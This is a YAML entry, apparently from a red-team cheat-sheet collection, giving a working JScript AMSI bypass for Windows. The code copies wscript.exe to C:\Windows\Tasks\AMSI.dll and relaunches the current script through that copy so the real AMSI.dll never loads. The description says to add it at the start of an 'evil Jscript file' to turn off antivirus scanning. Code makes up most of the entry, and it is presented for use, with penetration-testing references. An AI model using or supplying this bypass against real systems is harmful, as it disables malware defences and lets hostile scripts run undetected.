---
description: |
  In this Amsi Bypass it copies C:\Windows\System32\wscript.exe binary to a different location and rename in to AMSI.dll in order to prevent loading the real AMSI.dll. Add the code at the beginning of your evil Jscript file to turn off the AMSI.

  Command Reference:
  ```
  AMSI.dll: DLL to be overwritten

  wscript.exe: Excutable which will be copied into modified AMSI.dll

  -e:  option indicates that the specified script file will be processed by jscript.dll (GUID)

  GUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58
  ```
command: |
  AMSI Bypass in JScript renaming AMSI.dll

code: |
  var filesys= new ActiveXObject("Scripting.FileSystemObject"); 
  var sh = new ActiveXObject('WScript.Shell');
  try
  {
      if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
      {
          throw new Error(1, '');
      } 
  }
  catch(e)
  {
      filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
      sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
      WScript.Quit(1); 
  }

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass#jscript
  - LINK
---